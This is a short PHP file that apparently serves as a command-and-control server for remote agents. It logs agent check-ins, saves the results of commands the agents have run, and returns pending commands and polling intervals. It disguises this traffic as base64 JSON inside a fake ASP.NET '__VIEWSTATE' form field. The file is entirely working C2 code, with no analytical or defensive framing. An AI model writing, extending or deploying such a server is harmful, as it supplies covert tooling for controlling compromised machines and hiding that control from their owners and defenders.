<?php require 'common.php'; ?>

<?php

// handle command responses
$res = array();
$res['commands'] = array();
if (isset($_REQUEST['__VIEWSTATE'])) {

    $result = base64_decode($_REQUEST['__VIEWSTATE']);
    $jsonobj = json_decode($result);

    // process input
    // update command results
    foreach ($jsonobj->{'commands'} as $command) {
        $id = $command->{'id'};
        $result = $command->{'result'};
        $prep = $db->prepare('UPDATE commands SET time_rcv=datetime(\'now\'), result=:result WHERE id=:id');
        $prep->execute(array(':result' => $result, ':id' => $id));
    }

    // update last_poll if agent exists, else insert
    $agent = $jsonobj->{'agent'};
    $prep = $db->prepare('UPDATE agents SET last_poll = datetime(\'now\') WHERE id = :agent');
    $prep->execute(array(':agent' => $agent));
    if ($prep->rowCount() == 0) {
        $prep = $db->prepare('INSERT INTO agents (id, last_poll) VALUES (:agent, datetime(\'now\'))');
        $prep->execute(array(':agent' => $agent));
    }

    // build output
    // create command request for all unanswered commands
    $prep = $db->prepare('SELECT id, command FROM commands WHERE agent_id = :agent AND result IS NULL');
    $prep->execute(array(':agent' => $agent));
    while ($row = $prep->fetch(PDO::FETCH_ASSOC)) {
        array_push($res['commands'], $row);
    }

    // set polling interval based on the value in the database
    $prep = $db->prepare('SELECT interval FROM agents WHERE id = :agent');
    $prep->execute(array(':agent' => $agent));
    $row = $prep->fetch(PDO::FETCH_ASSOC);
    $res['interval'] = intval($row['interval']);
}
$command = base64_encode(json_encode($res));

?>
<!DOCTYPE HTML>
<html>
<head>
</head>
<body>
    <form method="post" action="">
        <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="<?php echo $command; ?>" />
    </form>
</body>
</html>
